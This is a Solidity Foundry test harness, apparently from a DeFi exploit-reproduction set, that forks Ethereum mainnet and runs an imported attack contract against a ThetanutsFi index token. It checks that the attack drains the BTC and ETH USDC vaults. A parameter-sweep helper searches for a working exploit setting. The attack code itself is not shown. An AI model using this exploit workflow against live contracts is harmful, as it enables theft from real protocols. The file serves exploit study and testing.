// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ThetanutsConstants as C} from "../../src/ThetanutsFi/Constants.sol";
import {IIndexToken} from "../../src/ThetanutsFi/interfaces/IIndexToken.sol";
import {AttackThetanutsFi} from "./AttackThetanutsFi.sol";

contract ThetanutsFiChallenge is Test {
    uint256 private btcVaultUsdcBefore;
    uint256 private ethVaultUsdcBefore;

    modifier checkSolvedByPlayer() {
        _assertInitialState();
        vm.startPrank(C.PLAYER, C.PLAYER);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        uint256 forkId = vm.createFork(vm.envString("ETH_RPC_URL"), C.FORK_BLOCK);
        vm.selectFork(forkId);
    }

    function testBorrowAmountMatchesForkState() public view {
        uint256 supply = IIndexToken(C.INDEX_TOKEN).totalSupply();
        assertEq(supply, C.INDEX_TOTAL_SUPPLY_AT_FORK);
        assertEq(supply - C.TARGET_REMAINING_SUPPLY, C.EXPECTED_BORROW_AMOUNT);
    }

    function testAttack() public checkSolvedByPlayer {
        AttackThetanutsFi attack = new AttackThetanutsFi(C.TARGET_REMAINING_SUPPLY);
        attack.attack(C.PLAYER);
    }

    /// @dev 依次尝试 claim 后 remaining supply = 0..10（探索用；正式 PoC 使用 TARGET_REMAINING_SUPPLY = 3）
    // function testSweepRemainingSupply() public {
    //     _sweepRemainingSupply(0, 10);
    // }

    function _sweepRemainingSupply(uint256 from, uint256 to) internal {
        emit log_string("=== sweep remaining supply ===");

        for (uint256 remaining = from; remaining <= to; remaining++) {
            uint256 forkId = vm.createFork(vm.envString("ETH_RPC_URL"), C.FORK_BLOCK);
            vm.selectFork(forkId);

            uint256 borrowAmount = IIndexToken(C.INDEX_TOKEN).totalSupply() - remaining;
            emit log_named_uint("remaining", remaining);
            emit log_named_uint("borrowAmount", borrowAmount);

            uint256 usdcBefore = IERC20(C.USDC).balanceOf(C.PLAYER);

            vm.startPrank(C.PLAYER, C.PLAYER);
            AttackThetanutsFi attack = new AttackThetanutsFi(remaining);
            try attack.attack(C.PLAYER) {
                uint256 usdcProfit = IERC20(C.USDC).balanceOf(C.PLAYER) - usdcBefore;
                emit log_named_uint("usdcProfit", usdcProfit);
                emit log_string("status: OK");
            } catch {
                emit log_string("status: FAIL");
            }
            vm.stopPrank();
        }
    }

    function _assertInitialState() internal {
        assertEq(IIndexToken(C.INDEX_TOKEN).totalSupply(), C.INDEX_TOTAL_SUPPLY_AT_FORK);

        btcVaultUsdcBefore = IERC20(C.USDC).balanceOf(C.VAULT_BTCUSD);
        ethVaultUsdcBefore = IERC20(C.USDC).balanceOf(C.VAULT_ETHUSD);

        assertGt(btcVaultUsdcBefore, 70_000e6);
        assertGt(ethVaultUsdcBefore, 35_000e6);
    }

    function _isSolved() internal view {
        uint256 usdcProfit = IERC20(C.USDC).balanceOf(C.PLAYER);
        assertApproxEqRel(usdcProfit, C.EXPECTED_USDC_PROFIT, 0.01e18);

        uint256 btcDrained = btcVaultUsdcBefore - IERC20(C.USDC).balanceOf(C.VAULT_BTCUSD);
        uint256 ethDrained = ethVaultUsdcBefore - IERC20(C.USDC).balanceOf(C.VAULT_ETHUSD);
        assertGt(btcDrained, 70_000e6);
        assertGt(ethDrained, 35_000e6);
    }
}

// forge test --match-test testAttack -vv          # 正式 PoC（remaining = 3）
// forge test --match-test testSweepRemainingSupply -vv  # 探索 0..10
